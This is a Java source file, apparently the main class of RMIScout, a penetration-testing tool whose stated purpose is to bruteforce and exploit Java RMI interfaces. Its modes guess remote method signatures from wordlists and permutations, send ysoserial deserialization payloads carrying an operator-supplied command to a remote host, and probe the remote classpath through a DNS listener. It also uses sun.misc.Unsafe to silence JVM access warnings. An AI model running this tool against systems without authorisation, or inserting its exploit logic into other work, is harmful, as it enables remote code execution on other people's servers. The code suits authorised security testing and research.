package com.bishopfox.rmiscout;

import com.bishopfox.gadgetprobe.GadgetProbe;
import com.google.common.collect.Lists;
import net.sourceforge.argparse4j.ArgumentParsers;
import net.sourceforge.argparse4j.impl.Arguments;
import net.sourceforge.argparse4j.inf.*;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;

public class RMIScout {


    public static ArrayList<String> readFileToList(File filename) {
        ArrayList<String> result = new ArrayList<>();
        try (Scanner s = new Scanner(new FileReader(filename))) {
            while (s.hasNext()) {
                result.add(s.nextLine());
            }
        } catch (FileNotFoundException | NullPointerException e) {
            System.err.println("Couldn't read file: " + filename);
            System.exit(1);
        }
        return result;
    }

    public static HashMap<String, ArrayList<String>> readFileToMap(File filename) {
        HashMap<String, ArrayList<String>> result = new HashMap<String, ArrayList<String>>();
        try (Scanner s = new Scanner(new FileReader(filename))) {
            while (s.hasNext()) {
                String line = s.nextLine();
                String type = line.split(" ")[0];

                if (!result.containsKey(type)) {
                    result.put(type, new ArrayList<>());
                }

                result.get(type).add(line);
            }
        } catch (FileNotFoundException | NullPointerException e) {
            System.err.println("Couldn't read file: " + filename);
            System.exit(1);
        }
        return result;
    }

    @SuppressWarnings("unchecked")
    public static void disableAccessWarnings() {
        try {
            Class unsafeClass = Class.forName("sun.misc.Unsafe");
            Field field = unsafeClass.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            Object unsafe = field.get(null);

            Method putObjectVolatile = unsafeClass.getDeclaredMethod("putObjectVolatile", Object.class, long.class, Object.class);
            Method staticFieldOffset = unsafeClass.getDeclaredMethod("staticFieldOffset", Field.class);

            Class loggerClass = Class.forName("jdk.internal.module.IllegalAccessLogger");
            Field loggerField = loggerClass.getDeclaredField("logger");
            Long offset = (Long) staticFieldOffset.invoke(unsafe, loggerField);
            putObjectVolatile.invoke(unsafe, loggerClass, offset, null);
        } catch (Exception ignored) {
        }
    }


    public static void main(String[] args) {
        // Disable reflective access warnings
        disableAccessWarnings();

        ArgumentParser parser = ArgumentParsers.newFor("rmiscout").build().defaultHelp(true).description("Bruteforce and exploit RMI interfaces");

        // Setup subparsers
        final String wordlistModeHelp = "Dictionary attack on RMI interfaces using a prototype wordlist";
        final String bruteforceModeHelp = "Bruteforce attack on RMI interfaces";
        final String exploitModeHelp = "Exploit RMI methods using type-mismatch deserialization attack";
        final String probeModeHelp = "Use GadgetProbe to enumerate classes available on the remote classpath";
        final String registryHelp = "Specific registry name to query. All names are queried";
        final String hostHelp = "Remote hostname or IP address";
        final String portHelp = "Remote RMI port";

        Subparsers subparsers = parser.addSubparsers().title("Modes of operation").metavar("MODE").dest("mode");
        Subparser wordlistMode = subparsers.addParser("wordlist").description(wordlistModeHelp).help(wordlistModeHelp);
        Subparser bruteforceMode = subparsers.addParser("bruteforce").description(bruteforceModeHelp).help(bruteforceModeHelp);
        Subparser exploitMode = subparsers.addParser("exploit").description(exploitModeHelp).help(exploitModeHelp);
        Subparser probeMode = subparsers.addParser("probe").description(probeModeHelp).help(probeModeHelp);

        wordlistMode.addArgument("-i", "--input").type(File.class).required(true).help("Wordlist of function prototypes");
        wordlistMode.addArgument("--allow-unsafe").setDefault(false).action(Arguments.storeTrue()).help("Allow execution of void function guesses.");
        wordlistMode.addArgument("--activation-server").setDefault(false).action(Arguments.storeTrue()).help("Support for deprecated RMI Activation Systems");
        wordlistMode.addArgument("-n", "--registry-name").help(registryHelp);
        wordlistMode.addArgument("host").help(hostHelp);
        wordlistMode.addArgument("port").type(Integer.class).help(portHelp);

        bruteforceMode.addArgument("-i", "--input").type(File.class).required(true).help("Wordlist of candidate method names");
        bruteforceMode.addArgument("--allow-unsafe").setDefault(false).action(Arguments.storeTrue()).help("Allow execution of void function guesses.");
        bruteforceMode.addArgument("--activation-server").setDefault(false).action(Arguments.storeTrue()).help("Support for deprecated RMI Activation Systems");
        bruteforceMode.addArgument("-r", "--return-types").required(true).help("Set of candidate return types");
        bruteforceMode.addArgument("-p", "--parameter-types").required(true).help("Set of candidate parameter types");
        bruteforceMode.addArgument("-l", "--parameter-length").required(true).help("Candidate parameter length range expressed as a comma-delimited range EX: 1,4");
        bruteforceMode.addArgument("-n", "--registry-name").help(registryHelp);
        bruteforceMode.addArgument("host").help(hostHelp);
        bruteforceMode.addArgument("port").type(Integer.class).help(portHelp);

        exploitMode.addArgument("-s", "--signature").required(true).help("String representing remote target method signature");
        exploitMode.addArgument("-p", "--payload").required(true).help("Fully-qualified name of payload implementing ObjectPayload<Object>. EX: ysoserial.payloads.URLDNS");
        exploitMode.addArgument("-c", "--command").required(true).help("Command String corresponding to payload");
        exploitMode.addArgument("-n", "--registry-name").help(registryHelp);
        exploitMode.addArgument("host").help(hostHelp);
        exploitMode.addArgument("port").type(Integer.class).help(portHelp);

        probeMode.addArgument("-i", "--input").type(File.class).required(true).help("Wordlist of function prototypes");
        probeMode.addArgument("-s", "--signature").required(true).help("String representing remote target method signature");
        probeMode.addArgument("-d", "--dns-endpoint").required(true).help("DNS listener domain");
        probeMode.addArgument("-n", "--registry-name").help(registryHelp);
        probeMode.addArgument("host").help(hostHelp);
        probeMode.addArgument("port").type(Integer.class).help(portHelp);

        Namespace ns = null;
        List<String> signatures = null;
        RMIConnector rmisearch = null;
        try {
            ns = parser.parseArgs(args);

            // Choose mode
            switch(ns.getString("mode")) {
                case "wordlist":
                    // Split by types
                    HashMap<String, ArrayList<String>> sigMap = readFileToMap(ns.get("input"));
                    for (Map.Entry<String, ArrayList<String>> entry : sigMap.entrySet()) {
                        process(ns.get("host"), ns.get("port"), ns.get("registry_name"), entry.getValue(), ns.get("allow_unsafe"), ns.get("activation_server"));
                    }
                    break;
                case "bruteforce":
                    String[] returnTypes = ns.getString("return_types").split(",");
                    String[] paramTypes = ns.getString("parameter_types").split(",");
                    String[] paramRangeParts = ns.getString("parameter_length").split(",");
                    int[] paramRange = null;
                    try {
                        paramRange = new int[]{Integer.parseInt(paramRangeParts[0]), Integer.parseInt(paramRangeParts[1])};

                        if (paramRange[1] < paramRange[0]) {
                            throw new IllegalArgumentException();
                        }
                    } catch (IllegalArgumentException | ArrayIndexOutOfBoundsException e){
                        System.err.println("Invalid option for '-n': should be expressed as lower,upper");
                        System.exit(1);
                    }

                    // Java Interfaces disallow different return types for otherwise identical prototypes
                    for (int i = 0; i < returnTypes.length; i++) {
                        signatures = generateMethods(ns.get("input"), returnTypes[i], paramRange, paramTypes);
                        process(ns.get("host"), ns.get("port"), ns.get("registry_name"), signatures, ns.get("allow_unsafe"), ns.get("activation_server"));
                    }
                    break;
                case "exploit":
                    // Add exploit signature
                    signatures = new ArrayList<>();
                    signatures.add(ns.get("signature"));

                    rmisearch = new RMIConnector(ns.get("host"), ns.get("port"), ns.get("registry_name"), signatures, false, ns.get("activation_server"));
                    rmisearch.exploit(ns.get("payload"), ns.get("command"));
                    rmisearch.cleanup();
                    break;
                case "probe":
                    // Add probe signature
                    signatures = new ArrayList<>();
                    signatures.add(ns.get("signature"));

                    // Setup GadgetProbe
                    GadgetProbe gp = new GadgetProbe(ns.get("dns_endpoint"));
                    List<String> classnames = readFileToList(ns.get("input"));

                    rmisearch = new RMIConnector(ns.get("host"), ns.get("port"), ns.get("registry_name"), signatures, false,  ns.get("activation_server"));
                    for (String classname : classnames) {
                        rmisearch.execute(gp.getObject(classname));
                    }
                    break;
            }
            System.exit(0);
        } catch (ArgumentParserException e) {
            parser.handleError(e);
            System.exit(1);
        }
    }

    private static void process(String host, int port, String registryName, List<String> signatures, boolean allowUnsafe, boolean isActivationServer) {
        // Perform batches of 1,000 dynamic methods to not exceed codesize limit of Proxy interface
        final int batch_size = 1000;
        for (int i = 0; i < (signatures.size()/batch_size)+1; i++) {
            int lower = i*batch_size;
            int upper = Integer.min(signatures.size(), (i+1)*batch_size);
            RMIConnector rmisearch = new RMIConnector(host, port, registryName, signatures.subList(lower, upper), allowUnsafe, isActivationServer);
            rmisearch.checkIfPresent();
            rmisearch.cleanup();
        }
    }

    private static List<String> generateMethods(File file, String returnType, int[] paramRanges, String[] paramTypes) {
        ArrayList<String> signatures = new ArrayList<>();
        List<String> methodList = readFileToList(file);

        // Generate prototype permutations
        System.out.println("Generating Permutations for [" + returnType + "] type...");

        Collection<List<String>> permutations = Lists.newArrayList();
        for (int i = paramRanges[0]; i <= paramRanges[1]; i++) {
            permutations.addAll(Permutations.permute(paramTypes, i));
        }

        System.out.println("Finished generating and querying " + permutations.size() * methodList.size() + " Permutations");


        for (String method : methodList) {
            for (List<String> l : permutations) {
                StringBuilder sb = new StringBuilder();
                sb.append(returnType);
                sb.append(" ");
                sb.append(method);
                sb.append("(");
                for (int i = 0; i < l.size(); i++) {
                    sb.append(l.get(i));
                    sb.append(" ");
                    sb.append(String.format("a%d", i));
                    if (i < l.size() - 1) {
                        sb.append(", ");
                    }
                }
                sb.append(")");
                signatures.add(sb.toString());
            }
        }
        return signatures;
    }
}